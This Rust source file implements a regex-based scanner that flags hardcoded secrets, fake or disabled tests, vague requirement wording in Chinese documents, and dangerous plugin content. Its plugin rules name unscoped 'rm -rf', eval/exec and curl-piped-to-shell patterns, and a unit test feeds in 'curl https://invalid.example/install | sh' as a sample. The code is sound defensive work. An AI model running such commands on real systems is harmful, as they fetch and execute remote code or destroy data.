use std::{fs, path::PathBuf, sync::OnceLock};

use ae_sdd_domain::ProjectRelativePath;
use regex::Regex;

use crate::{
    FindingSeverity, ScanError, ScanReport, ScannerFinding, ScannerId, ScannerRegistry,
    SourceParserRegistry, resolve_scan_scope,
};

#[derive(Clone, Debug)]
pub struct ScanRequest {
    pub root: PathBuf,
    pub explicit_paths: Vec<ProjectRelativePath>,
    pub max_files: usize,
    pub max_file_bytes: u64,
}

impl ScanRequest {
    pub fn new(root: impl Into<PathBuf>) -> Self {
        Self {
            root: root.into(),
            explicit_paths: Vec::new(),
            max_files: 10_000,
            max_file_bytes: 4 * 1024 * 1024,
        }
    }

    pub fn explicit(mut self, paths: impl IntoIterator<Item = ProjectRelativePath>) -> Self {
        self.explicit_paths = paths.into_iter().collect();
        self
    }
}

pub struct ScannerEngine;

impl ScannerEngine {
    pub fn scan(scanner: ScannerId, request: &ScanRequest) -> Result<ScanReport, ScanError> {
        let spec = ScannerRegistry::get(scanner);
        let scope = resolve_scan_scope(&request.root, spec.scope, &request.explicit_paths)?;
        if scope.files.is_empty() {
            return Err(ScanError::EmptyScope);
        }
        if scope.files.len() > request.max_files {
            return Err(ScanError::FileCountLimit {
                actual: scope.files.len(),
                maximum: request.max_files,
            });
        }

        let mut scanned_paths = Vec::with_capacity(scope.files.len());
        let mut findings = Vec::new();
        for (relative, absolute) in scope.files {
            let metadata = fs::metadata(&absolute).map_err(|source| ScanError::Read {
                path: absolute.clone(),
                source,
            })?;
            if metadata.len() > request.max_file_bytes {
                return Err(ScanError::FileByteLimit {
                    path: relative,
                    actual: metadata.len(),
                    maximum: request.max_file_bytes,
                });
            }
            let bytes = fs::read(&absolute).map_err(|source| ScanError::Read {
                path: absolute,
                source,
            })?;
            let parser = SourceParserRegistry::parser_for(&relative)
                .ok_or_else(|| crate::ParseError::UnsupportedPath(relative.clone()))?;
            SourceParserRegistry::validate(parser, &relative, &bytes)?;
            let text = std::str::from_utf8(&bytes)
                .map_err(|_| crate::ParseError::NotUtf8(relative.clone()))?;
            scan_document(scanner, &relative, text, &mut findings);
            scanned_paths.push(relative);
        }
        Ok(ScanReport::new(scanner, scanned_paths, findings))
    }
}

struct LineRule {
    severity: FindingSeverity,
    id: &'static str,
    regex: Regex,
    message: &'static str,
}

fn rule(
    severity: FindingSeverity,
    id: &'static str,
    expression: &str,
    message: &'static str,
) -> LineRule {
    LineRule {
        severity,
        id,
        regex: Regex::new(expression).expect("scanner rule is valid"),
        message,
    }
}

fn scan_document(
    scanner: ScannerId,
    path: &ProjectRelativePath,
    text: &str,
    findings: &mut Vec<ScannerFinding>,
) {
    if !is_rule_definition_source(path) {
        for (line_index, line) in text.lines().enumerate() {
            for rule in line_rules(scanner) {
                if rule.id == "hardcoded-external-url"
                    && (line.contains("localhost")
                        || line.contains("127.0.0.1")
                        || line.contains("${"))
                {
                    continue;
                }
                if rule.regex.is_match(line) {
                    findings.push(ScannerFinding::new(
                        rule.severity,
                        rule.id,
                        path.clone(),
                        line_index + 1,
                        rule.message,
                    ));
                }
            }
        }
    }

    match scanner {
        ScannerId::CodingAuthenticity => scan_coding_document(path, text, findings),
        ScannerId::TestAuthenticity => scan_test_document(path, text, findings),
        ScannerId::RaAuthenticity => scan_ra_authenticity(path, text, findings),
        ScannerId::RaFlowViolation => scan_ra_flow(path, text, findings),
        ScannerId::RaDepth => scan_ra_depth(path, text, findings),
        ScannerId::RaImplementation => scan_ra_implementation(path, text, findings),
        ScannerId::RaCore => crate::ra_specification::scan_ra_v2(
            path,
            text,
            crate::ra_specification::LensCheck::Core,
            findings,
        ),
        ScannerId::RaApplicability => crate::ra_specification::scan_ra_v2(
            path,
            text,
            crate::ra_specification::LensCheck::Applicability,
            findings,
        ),
        ScannerId::RaClosure => crate::ra_specification::scan_ra_v2(
            path,
            text,
            crate::ra_specification::LensCheck::Closure,
            findings,
        ),
        ScannerId::PluginContent => scan_plugin_document(path, text, findings),
    }
}

fn line_rules(scanner: ScannerId) -> &'static [LineRule] {
    static CODING: OnceLock<Vec<LineRule>> = OnceLock::new();
    static TEST: OnceLock<Vec<LineRule>> = OnceLock::new();
    static RA: OnceLock<Vec<LineRule>> = OnceLock::new();
    static PLUGIN: OnceLock<Vec<LineRule>> = OnceLock::new();
    match scanner {
        ScannerId::CodingAuthenticity => CODING.get_or_init(|| {
            vec![
                rule(FindingSeverity::Blocker, "hallucinated-transactional-event-fallback", r"@TransactionalEventListener\s*\([^)]*\bfallback\s*=", "TransactionalEventListener has no fallback parameter."),
                rule(FindingSeverity::Blocker, "legacy-web-security-configurer-adapter", r"\bWebSecurityConfigurerAdapter\b", "Legacy Spring Security configuration requires an explicit compatibility decision."),
                rule(FindingSeverity::Blocker, "hardcoded-secret", r#"(?i)\b(password|passwd|secret|token|api[_-]?key)\b\s*(?:(?::\s*[^=;\n]+)?=|:)\s*[\"'][^\"'${}]{4,}[\"']"#, "Credential-like values must come from protected configuration."),
                rule(FindingSeverity::Blocker, "hardcoded-external-url", r#"[\"']https?://[^\"']+[\"']"#, "External URLs must be explicit configuration."),
                rule(FindingSeverity::Blocker, "hardcoded-timeout-retry-ttl", r"(?i)\b(timeout|retrycount|maxretries|ttl|expireseconds|delaymillis|sleepmillis)\b\s*=\s*\d+", "Timeout, retry, TTL, and delay values require a policy/configuration source."),
                rule(FindingSeverity::Blocker, "thread-sleep-production", r"\bThread\.sleep\s*\(|\bTimeUnit\.[A-Z_]+\.sleep\s*\(", "Production fixed sleeps are not deterministic synchronization."),
                rule(FindingSeverity::Warn, "todo-fixme-production", r"\b(TODO|FIXME|XXX)\b", "Production TODO markers require an explicit disposition."),
            ]
        }),
        ScannerId::TestAuthenticity => TEST.get_or_init(|| {
            vec![
                rule(FindingSeverity::Blocker, "disabled-test", r"@(Disabled|Ignore)\b|#\s*\[ignore\]", "Test is disabled or ignored."),
                rule(FindingSeverity::Blocker, "assumption-skip", r"\b(?:Assume\.|Assumptions\.)?assume(?:True|False)\s*\(\s*(?:false|true)\s*\)", "A constant assumption can skip the test."),
                rule(FindingSeverity::Blocker, "literal-assert-true", r"\b(?:Assertions\.|Assert\.)?assertTrue\s*\(\s*true\s*\)|assert!\s*\(\s*true\s*\)", "Always-true assertions do not validate behavior."),
                rule(FindingSeverity::Blocker, "literal-assert-false", r"\b(?:Assertions\.|Assert\.)?assertFalse\s*\(\s*false\s*\)", "Always-false negative assertions do not validate behavior."),
                rule(FindingSeverity::Blocker, "thread-sleep", r"\bThread\.sleep\s*\(|\bTimeUnit\.[A-Z_]+\.sleep\s*\(", "Fixed sleeps are banned in tests."),
                rule(FindingSeverity::Blocker, "deep-stubs", r"\bRETURNS_DEEP_STUBS\b", "Deep stubs usually validate mocks instead of behavior."),
                rule(FindingSeverity::Blocker, "mock-any-return", r"\bthenReturn\s*\(\s*(?:Mockito\.)?any\w*\s*\(", "A mock must return a concrete value, not an argument matcher."),
            ]
        }),
        ScannerId::RaAuthenticity => RA.get_or_init(|| {
            vec![
                rule(FindingSeverity::Blocker, "vague-ellipsis", r"(?:等等|诸如此类|etc\.)", "Enumerate the affected items instead of using an open-ended placeholder."),
                rule(FindingSeverity::Warn, "placeholder-fill", r"(?i)TODO|TBD|FIXME|\{\s*(?:xxx|TODO|TBD)\s*\}|待补充", "Uncertain information must identify its missing source."),
                rule(FindingSeverity::Blocker, "masked-gap", r"已解决|已确认|无缺口|无需处理", "Resolved/no-gap claims require traceable evidence."),
                rule(FindingSeverity::Warn, "hidden-conflict", r"无冲突|没有冲突|不存在冲突", "No-conflict claims require an enumerated conflict check."),
                rule(FindingSeverity::Blocker, "missing-timeliness", r"尽快|及时|立即|马上|实时|迅速", "Timeliness requirements need a measurable bound."),
            ]
        }),
        ScannerId::PluginContent => PLUGIN.get_or_init(|| {
            vec![
                rule(FindingSeverity::Blocker, "PC-001-dangerous-delete", r"rm\s+-rf?\s+(?:/|~|\$HOME|\*|%|C:\\)", "Unscoped recursive deletion is prohibited."),
                rule(FindingSeverity::Blocker, "PC-002-arbitrary-command-exec", r"os\.system\s*\(|subprocess\.(?:call|run|Popen)\s*\([^)]*shell\s*=\s*True|\beval\s*\(|\bexec\s*\(", "Arbitrary command or code execution is prohibited."),
                rule(FindingSeverity::Blocker, "PC-003-remote-script-exec", r"(?:curl|wget)[^|]*\|\s*(?:bash|sh|zsh)\b", "Remote content must not be piped directly into a shell."),
                rule(FindingSeverity::Warn, "PC-004-gate-bypass", r"(?i)(?:skip|ignore|disable|跳过|忽略).{0,8}(?:G-\d+|gate|门禁)", "Plugin text appears to weaken Gate enforcement."),
                rule(FindingSeverity::Warn, "PC-005-hardcoded-secret", r#"(?i)\b(password|passwd|secret|token|api[_-]?key)\b\s*[:=]\s*[\"'][^\"'${}]{4,}[\"']"#, "Plugin contains a credential-like literal."),
                rule(FindingSeverity::Info, "PC-006-internal-ip", r"\b(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.\d{1,3}\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})\b", "Plugin contains an internal network address."),
                rule(FindingSeverity::Blocker, "PC-007-excessive-permission", r"chmod\s+777\b|chmod\s+\+x\s+/\S+", "Plugin requests excessive filesystem permissions."),
                rule(FindingSeverity::Warn, "PC-008-check-bypass", r"git\s+\w+\s+--no-verify\b|git\s+push\s+--force(?:-with-lease)?\b", "Plugin bypasses checks or rewrites remote history."),
                rule(FindingSeverity::Warn, "PC-009-hardcoded-output-path", r"design/story/be/|design/testcase/be/|\.ae-project/assets\.md|life-team-project-docs/|\.ae-task/|\.ae-plan/|\.spec/iterations/", "Output paths must be resolved through document storage."),
            ]
        }),
        ScannerId::RaFlowViolation
        | ScannerId::RaDepth
        | ScannerId::RaImplementation
        | ScannerId::RaCore
        | ScannerId::RaApplicability
        | ScannerId::RaClosure => &[],
    }
}

fn scan_coding_document(
    path: &ProjectRelativePath,
    text: &str,
    findings: &mut Vec<ScannerFinding>,
) {
    static EMPTY_CATCH: OnceLock<Regex> = OnceLock::new();
    let pattern = EMPTY_CATCH.get_or_init(|| {
        Regex::new(r"(?s)catch\s*\([^)]*\)\s*\{\s*(?:(?://[^\n]*\n\s*)|(?:/\*.*?\*/\s*))*(?:return\s*(?:null)?\s*;\s*)?\}")
            .expect("valid empty catch rule")
    });
    for matched in pattern.find_iter(text) {
        findings.push(ScannerFinding::new(
            FindingSeverity::Blocker,
            "empty-or-swallowed-catch",
            path.clone(),
            line_number(text, matched.start()),
            "Exceptions must not be silently swallowed.",
        ));
    }
}

fn scan_test_document(path: &ProjectRelativePath, text: &str, findings: &mut Vec<ScannerFinding>) {
    static SAME_ASSERT: OnceLock<Regex> = OnceLock::new();
    let same_assert = SAME_ASSERT.get_or_init(|| {
        Regex::new(r"assert(?:Equals|Same)\s*\(\s*([A-Za-z_][\w.]*)\s*,\s*([A-Za-z_][\w.]*)")
            .expect("valid assertion rule")
    });
    for captures in same_assert.captures_iter(text) {
        if captures.get(1).map(|value| value.as_str())
            == captures.get(2).map(|value| value.as_str())
        {
            let start = captures.get(0).map_or(0, |value| value.start());
            findings.push(ScannerFinding::new(
                FindingSeverity::Blocker,
                "same-value-assertion",
                path.clone(),
                line_number(text, start),
                "An assertion comparing a value with itself is always true.",
            ));
        }
    }
    if (text.contains("MockMvc") || text.contains("@WebMvcTest"))
        && !(text.contains("RANDOM_PORT")
            || text.contains("TestRestTemplate")
            || text.contains("bindToServer"))
    {
        findings.push(ScannerFinding::new(
            FindingSeverity::Blocker,
            "mock-http-boundary",
            path.clone(),
            1,
            "Mock HTTP tests cannot be the sole evidence for an HTTP acceptance contract.",
        ));
    }
    if path.as_str().ends_with(".xml") {
        scan_test_xml_attributes(path, text, findings);
    }
}

fn scan_test_xml_attributes(
    path: &ProjectRelativePath,
    text: &str,
    findings: &mut Vec<ScannerFinding>,
) {
    static FAILURE: OnceLock<Regex> = OnceLock::new();
    let failure = FAILURE.get_or_init(|| {
        Regex::new(r#"(?:failures|errors|skipped)\s*=\s*[\"']([1-9][0-9]*)[\"']"#)
            .expect("valid XML summary rule")
    });
    for matched in failure.find_iter(text) {
        findings.push(ScannerFinding::new(
            FindingSeverity::Blocker,
            "test-xml-nonpassing",
            path.clone(),
            line_number(text, matched.start()),
            "Test evidence reports failures, errors, or skipped tests.",
        ));
    }
}

fn scan_ra_authenticity(
    path: &ProjectRelativePath,
    text: &str,
    findings: &mut Vec<ScannerFinding>,
) {
    for (line_index, line) in text.lines().enumerate() {
        let trimmed = line.trim_start();
        let is_conclusion = trimmed.starts_with("- ") || trimmed.starts_with("| ");
        let has_claim = ["必须", "应该", "触发", "影响", "禁止", "requires", "must"]
            .iter()
            .any(|word| line.contains(word));
        let has_evidence = ["来源", "PRD", "Issue #", "assets.", "cite", "§", "行号"]
            .iter()
            .any(|word| line.contains(word));
        if is_conclusion && has_claim && !has_evidence {
            findings.push(ScannerFinding::new(
                FindingSeverity::Warn,
                "no-evidence",
                path.clone(),
                line_index + 1,
                "Conclusion-like RA entries should identify their evidence source.",
            ));
        }
    }
}

fn scan_ra_flow(path: &ProjectRelativePath, text: &str, findings: &mut Vec<ScannerFinding>) {
    let requirements: &[(&str, &[&str], &str)] = &[
        (
            "R1",
            &["RequirementAnalysisModel"],
            "RequirementAnalysisModel section is missing.",
        ),
        ("R3", &["缺口", "Gap"], "Gap management section is missing."),
        (
            "R4",
            &["规模", "Scale"],
            "Scale decision section is missing.",
        ),
        (
            "R5",
            &["自检", "self-check"],
            "RA self-check section is missing.",
        ),
        (
            "R7",
            &["5 问", "5-question"],
            "Five-question self-check is missing.",
        ),
    ];
    for (rule, alternatives, message) in requirements {
        require_any(path, text, findings, rule, alternatives, message);
    }
    let dimensions = [
        "现状",
        "目标",
        "角色",
        "流程",
        "数据",
        "边界",
        "非功能",
        "验收",
    ];
    let missing: Vec<_> = dimensions
        .iter()
        .filter(|dimension| !text.contains(**dimension))
        .collect();
    let numbered_model_complete = (1..=8).all(|index| text.contains(&format!("RA-{index:02}")));
    if !missing.is_empty() && !numbered_model_complete {
        findings.push(ScannerFinding::new(
            FindingSeverity::Blocker,
            "R2",
            path.clone(),
            1,
            "The eight RA dimensions are incomplete.",
        ));
    }
    if text.matches("RA-G").count() < 16 {
        findings.push(ScannerFinding::new(
            FindingSeverity::Blocker,
            "R6",
            path.clone(),
            1,
            "RA must record all sixteen RA-G decisions.",
        ));
    }
}

fn scan_ra_depth(path: &ProjectRelativePath, text: &str, findings: &mut Vec<ScannerFinding>) {
    let requirements: &[(&str, &[&str], &str)] = &[
        (
            "D1",
            &["证据", "Evidence"],
            "Evidence inventory is missing.",
        ),
        ("D2", &["冲突", "Conflict"], "Conflict analysis is missing."),
        ("D3", &["缺口", "Gap"], "Gap derivation is missing."),
        (
            "D4",
            &["时效", "Timeliness", "秒内"],
            "Measurable timeliness analysis is missing.",
        ),
        (
            "D5",
            &["业务模式", "Business pattern"],
            "Business-pattern applicability matrix is missing.",
        ),
    ];
    for (rule, alternatives, message) in requirements {
        require_any(path, text, findings, rule, alternatives, message);
    }
    if ["尽快", "及时", "立即", "马上", "实时", "迅速"]
        .iter()
        .any(|word| text.contains(word))
    {
        findings.push(ScannerFinding::new(
            FindingSeverity::Blocker,
            "D4",
            path.clone(),
            1,
            "Timeliness must use a measurable duration instead of a vague adverb.",
        ));
    }
}

fn scan_ra_implementation(
    path: &ProjectRelativePath,
    text: &str,
    findings: &mut Vec<ScannerFinding>,
) {
    let requirements: &[(&str, &[&str], &str)] = &[
        (
            "I1",
            &["数据源", "Data source"],
            "Data-source inventory is missing.",
        ),
        (
            "I2",
            &["数据流", "Data flow"],
            "Data-flow chain is missing.",
        ),
        (
            "I3",
            &["术语", "定义", "Invariant"],
            "Terms and invariants are missing.",
        ),
        (
            "I4",
            &["现有实现", "复用证据", "Reuse"],
            "Existing implementation/reuse evidence is missing.",
        ),
        (
            "I5",
            &["高成本", "拒绝方案", "Alternative"],
            "High-cost design rejection and alternative are missing.",
        ),
        (
            "I6",
            &["开发者疑问", "工程疑问", "Developer question"],
            "Developer question matrix is missing.",
        ),
        (
            "I7",
            &["DR 交接", "交接包", "DR handoff"],
            "DR handoff package is missing.",
        ),
    ];
    for (rule, alternatives, message) in requirements {
        require_any(path, text, findings, rule, alternatives, message);
    }
}

fn scan_plugin_document(
    path: &ProjectRelativePath,
    text: &str,
    findings: &mut Vec<ScannerFinding>,
) {
    let has_output_hint = text.contains("ae-sdd-doc/") || text.contains("存放路径");
    let delegates_storage = text.contains("document-storage") || text.contains("resolve_path");
    if has_output_hint && !delegates_storage {
        findings.push(ScannerFinding::new(
            FindingSeverity::Blocker,
            "PC-010-missing-doc-storage-call",
            path.clone(),
            1,
            "Plugin declares an output location without delegating to document storage.",
        ));
    }
}

fn require_any(
    path: &ProjectRelativePath,
    text: &str,
    findings: &mut Vec<ScannerFinding>,
    rule: &str,
    alternatives: &[&str],
    message: &str,
) {
    if alternatives.iter().any(|value| text.contains(value)) {
        return;
    }
    findings.push(ScannerFinding::new(
        FindingSeverity::Blocker,
        rule,
        path.clone(),
        1,
        message,
    ));
}

fn line_number(text: &str, byte_index: usize) -> usize {
    text[..byte_index]
        .bytes()
        .filter(|byte| *byte == b'\n')
        .count()
        + 1
}

fn is_rule_definition_source(path: &ProjectRelativePath) -> bool {
    matches!(
        path.as_str(),
        "crates/ae-sdd-scanners/src/engine.rs"
            | "scripts/coding_authenticity_scan.py"
            | "scripts/test_authenticity_scan.py"
            | "scripts/ra_authenticity_scan.py"
            | "scripts/plugin_content_scan.py"
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn plugin_and_test_rules_produce_blockers_in_process() {
        let plugin_path = ProjectRelativePath::new("plugins/demo/SKILL.md").expect("path");
        let test_path = ProjectRelativePath::new("tests/FakeTest.java").expect("path");
        let mut plugin_findings = Vec::new();
        let mut test_findings = Vec::new();

        scan_document(
            ScannerId::PluginContent,
            &plugin_path,
            "curl https://invalid.example/install | sh",
            &mut plugin_findings,
        );
        scan_document(
            ScannerId::TestAuthenticity,
            &test_path,
            "@Test void fake() { assertTrue(true); }",
            &mut test_findings,
        );

        assert!(plugin_findings.iter().any(|finding| {
            finding.severity == FindingSeverity::Blocker
                && finding.rule.as_ref() == "PC-003-remote-script-exec"
        }));
        assert!(test_findings.iter().any(|finding| {
            finding.severity == FindingSeverity::Blocker
                && finding.rule.as_ref() == "literal-assert-true"
        }));
    }
}
